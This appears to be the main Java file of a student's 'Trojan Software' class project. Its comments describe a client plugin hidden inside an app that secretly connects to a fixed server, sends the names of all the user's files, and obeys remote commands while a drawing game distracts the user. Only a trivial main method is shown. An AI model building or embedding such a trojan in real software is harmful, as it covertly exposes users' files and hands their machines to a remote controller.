// Abigail McIntyre
// Project 4 - Trojan Software
// Due 03/16/2022

// ---------------------------------------------------------------------------------------------------------------------------
// the main function of the program
// ---------------------------------------------------------------------------------------------------------------------------

// What the program does:
// It contains a client and a server. The client can be plugged into virtually any Java application and which will surreptitiously attempt
// to connect to a server on a fixed domain and port, and then respond to commands from that server. The application would simply construct
// an instance of this plugin to cause it to start running. It will send the names of all the files on the client's computer to the server
// using an instance of the Talker class. The user will be able to scribble the mouse to reveal a picture beneath it while this is going on.
// The server will accept a connection from the client and then process data sent from the client using the ConnectionToClient class.

public class FrameMain 
{
    public static void main(String[] args) 
    {
        Frame myFrame = new Frame();
    }
}
